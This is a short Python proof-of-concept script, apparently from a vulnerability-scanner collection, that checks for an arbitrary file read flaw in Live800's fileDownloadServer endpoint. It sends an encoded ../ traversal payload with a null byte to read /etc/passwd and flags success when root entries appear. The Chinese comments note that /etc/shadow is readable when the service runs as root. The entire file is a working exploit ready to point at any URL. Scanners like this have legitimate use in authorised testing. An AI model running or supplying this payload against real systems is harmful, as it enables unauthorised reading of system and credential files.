#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800 fileDownloadServer文件读取漏洞
referer: unknown
author: Lucifer
description: 拼接导致的任意文件读取，root权限可读shadow。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class live800_fileDownloadServer_fileread:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/live800/fileDownloadServer?companyID=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd%00&fid=3&fna=a&act=1"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                printGreen("[+]Success:存在live800 fileDownloadServer文件读取漏洞...(高危)\tpayload: "+vulnurl)
            else:
                printBlue("[-]Info:不存在live800_fileDownloadServer_fileread漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = live800_fileDownloadServer_fileread(sys.argv[1])
    testVuln.run()
